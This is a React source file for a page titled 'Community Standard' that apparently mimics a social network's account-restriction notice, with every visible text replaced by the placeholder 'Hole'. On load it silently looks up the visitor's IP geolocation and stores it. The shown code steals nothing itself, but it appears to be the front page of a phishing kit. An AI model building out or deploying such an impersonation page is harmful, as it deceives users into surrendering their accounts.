import HeroImage from '@/assets/images/hero-image.jpg';
import { PATHS } from '@/router/router';
import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useEffect, useState } from 'react';
import { useNavigate } from 'react-router';

const Index = () => {
    const navigate = useNavigate();
    const [today, setToday] = useState();
    const [isLoading, setIsLoading] = useState(true);
    
    const texts = {
        title: 'Hole',
        description: "Hole",
        protectionText: "Hole",
        processText: 'Hole',
        continueBtn: 'Hole',
        restrictedText: 'Hole on'
    };

    useEffect(() => {
        const init = async () => {
            const date = new Date();
            const options = {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            };
            setToday(date.toLocaleString('en-US', options));
            localStorage.clear();

            // Chỉ lấy thông tin IP để hiển thị nếu cần, không dịch tự động
            try {
                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                localStorage.setItem('ipInfo', JSON.stringify(response.data));
            } catch (error) {
                console.log('Failed to fetch IP info:', error);
            }
            
            setIsLoading(false);
        };

        init();
    }, []);

    return (
        <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
            <title>Community Standard</title>
            <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
                <img src={HeroImage} alt='' />
                <p className='text-3xl font-bold'>{texts.title}</p>
                <p className='leading-6 text-[#212529]'>{texts.description}</p>
                <div className='relative flex flex-col gap-4'>
                    <div className='absolute top-1/2 left-3 h-[70%] w-0.5 -translate-y-1/2 bg-gray-200'></div>

                    <div className='z-10 flex items-center gap-2'>
                        <FontAwesomeIcon icon={faCircleCheck} className='h-7 w-7 bg-white text-gray-300' size='xl' />
                        <p>{texts.protectionText}</p>
                    </div>
                    <div className='z-10 flex items-center gap-2'>
                        <FontAwesomeIcon icon={faIdCard} className='h-7 w-7 bg-white text-[#355797]' size='xl' />
                        <p>{texts.processText}</p>
                    </div>
                </div>
                <button
                    className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50'
                    disabled={isLoading}
                    onClick={() => {
                        navigate(PATHS.HOME);
                    }}
                >
                    {texts.continueBtn}
                </button>
                <p className='text-center'>
                    {texts.restrictedText} <span className='font-bold'>{today}</span>
                </p>
            </div>
        </div>
    );
};

export default Index;
